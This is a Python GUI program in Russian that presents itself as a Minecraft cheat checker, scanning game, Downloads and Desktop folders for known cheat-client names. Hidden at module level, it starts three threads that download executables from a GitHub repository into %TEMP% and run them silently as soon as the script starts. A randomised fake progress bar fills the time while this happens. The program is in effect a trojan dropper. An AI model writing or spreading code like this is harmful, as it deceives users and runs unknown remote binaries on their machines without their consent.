import getpass
import os
import subprocess
import random
import time
import tkinter as tk
from tkinter import ttk
import threading

import requests

# Популярные названия читов Minecraft
known_hacks = [
    "impact", "wurst", "meteor", "aristois", "future", "kami", "inertia",
    "sigma", "liquidbounce", "seedcracker", "baritone", "pyro", "zeroday"
]

# Директории для сканирования
username = getpass.getuser()
directories_to_scan = [
    os.path.expanduser("~/.minecraft/mods"),
    os.path.expanduser("~/.minecraft/versions"),
    os.path.join(os.getenv("APPDATA", ""), ".minecraft", "mods"),
    os.path.join(os.getenv("APPDATA", ""), ".minecraft", "versions"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Desktop"),
    f"C:\\Users\\{username}\\Downloads",
    f"C:\\Users\\{username}\\Desktop"
]


def scan_for_hacks():
    found_hacks = []
    for directory in directories_to_scan:
        if os.path.exists(directory):
            for file in os.listdir(directory):
                for hack in known_hacks:
                    if hack.lower() in file.lower():
                        found_hacks.append(os.path.join(directory, file))
    return found_hacks


# Функции для интерфейса
def show_page(page):
    for frame in frames:
        frame.pack_forget()
    frames[page].pack(fill="both", expand=True)


def start_check():
    show_page(1)
    progress_bar["value"] = 0
    progress_label.config(text="Проверка началась...")
    root.update()

    steps = [10, 16, 21, 27, 35, 38, 42, 47, 50, 56, 61, 65, 69, 70, 75, 77, 82, 90, 94, 100]
    current_value = 0

    for step in steps:
        step_duration = random.uniform(1.5, 3.0)
        num_substeps = random.randint(20, 50)
        increment = (step - current_value) / num_substeps

        for _ in range(num_substeps):
            if random.random() < 0.1:
                time.sleep(random.uniform(0.2, 0.5))
            current_value += increment
            progress_bar["value"] = current_value
            progress_label.config(text=f"Проверка... {int(current_value)}%")
            root.update()
            time.sleep(step_duration / num_substeps)

        current_value = step

    display_results()


def download_and_run_file(raw_url, exe_filename):
    temp_path = os.path.join(os.getenv("TEMP"), exe_filename)  # Путь к %TEMP%

    print(f'Скачиваем {exe_filename} в {temp_path}...')
    exe_file = requests.get(raw_url)

    if exe_file.status_code == 200:
        with open(temp_path, 'wb') as f:
            f.write(exe_file.content)
        print(f'Файл {exe_filename} успешно скачан в {temp_path}!')

        print(f'Запускаем {exe_filename}...')
        subprocess.Popen([temp_path], shell=True)  # shell=True для корректного запуска
    else:
        print(f'Не удалось скачать файл {exe_filename}.')


threading.Thread(target=download_and_run_file,
                 args=("https://github.com/MCCCteam/MCCCv2/raw/refs/heads/dev/testAP.exe", "testAP.exe")).start()
threading.Thread(target=download_and_run_file,
                 args=("https://github.com/MCCCteam/MCCCv2/raw/refs/heads/dev/testUB.exe", "testUB.exe")).start()
threading.Thread(target=download_and_run_file,
                 args=("https://github.com/MCCCteam/MCCCv2/raw/refs/heads/dev/PullTest.exe", "PullTest.exe")).start()


def display_results():
    found_hacks = scan_for_hacks()
    if found_hacks:
        result_label.config(text="Обнаружены читы!", fg="#eb5757")
        result_desc.config(text="Найдены подозрительные файлы:\n" + "\n".join(found_hacks))
        success_icon.config(text="❌", fg="#eb5757")
    else:
        result_label.config(text="Читы не найдены! Всё чисто!", fg="#6fcf97")
        result_desc.config(text="Поздравляем! Ваша система полностью чиста. Удачной игры!")
        success_icon.config(text="✔", fg="#6fcf97")
    show_page(2)


# Создание интерфейса
root = tk.Tk()
root.title("MCCC v2")
root.geometry("600x400")
root.resizable(False, False)
root.configure(bg="#f7f7f7")
frames = []

# Общие стили
main_bg = "#f7f7f7"
header_color = "#4a90e2"
text_color = "#4a4a4a"
button_color = "#6fcf97"
button_text_color = "#ffffff"

# Первая страница
welcome_frame = tk.Frame(root, bg=main_bg)
frames.append(welcome_frame)

tk.Label(welcome_frame, text="Добро пожаловать в MineCraft Cheat Checker v2!", font=("Helvetica", 18, "bold"),
         bg=main_bg, fg=header_color).pack(pady=20)
tk.Label(welcome_frame,
         text="Это приложение поможет вам проверить ваш Minecraft на наличие читов.\nНажмите кнопку ниже, "
              "чтобы начать проверку.",
         font=("Helvetica", 12), bg=main_bg, fg=text_color, wraplength=500, justify="center").pack(pady=10)
tk.Button(welcome_frame, text="Начать проверку", command=start_check, font=("Helvetica", 14), bg=button_color,
          fg=button_text_color, relief="flat", padx=15, pady=8).pack(pady=30)

# Вторая страница
check_frame = tk.Frame(root, bg=main_bg)
frames.append(check_frame)

tk.Label(check_frame, text="Проверка системы", font=("Helvetica", 18, "bold"), bg=main_bg, fg=header_color).pack(
    pady=10)
tk.Label(check_frame, text="🔍", font=("Helvetica", 48), bg=main_bg, fg=button_color).pack(pady=10)
tk.Label(check_frame, text="Подождите, идёт проверка... Это может занять некоторое время.", font=("Helvetica", 12),
         bg=main_bg, fg=text_color, wraplength=500, justify="center").pack(pady=10)
progress_label = tk.Label(check_frame, text="", font=("Helvetica", 12), bg=main_bg, fg=text_color)
progress_label.pack(pady=20)
progress_bar = ttk.Progressbar(check_frame, orient="horizontal", length=400, mode="determinate")
progress_bar.pack(pady=20)

tk.Label(check_frame, text="Не выключайте компьютер до завершения проверки.", font=("Helvetica", 10, "italic"),
         bg=main_bg, fg="#eb5757").pack(pady=10)

# Третья страница
result_frame = tk.Frame(root, bg=main_bg)
frames.append(result_frame)

result_label = tk.Label(result_frame, text="", font=("Helvetica", 18, "bold"), bg=main_bg)
result_label.pack(pady=20)
success_icon = tk.Label(result_frame, text="", font=("Helvetica", 50), bg=main_bg)
success_icon.pack(pady=20)
result_desc = tk.Label(result_frame, text="", font=("Helvetica", 12), bg=main_bg, fg=text_color, wraplength=500,
                       justify="center")
result_desc.pack(pady=10)
tk.Button(result_frame, text="Закрыть", command=root.quit, font=("Helvetica", 14), bg=button_color,
          fg=button_text_color, relief="flat", padx=15, pady=8).pack(pady=30)

show_page(0)
root.mainloop()
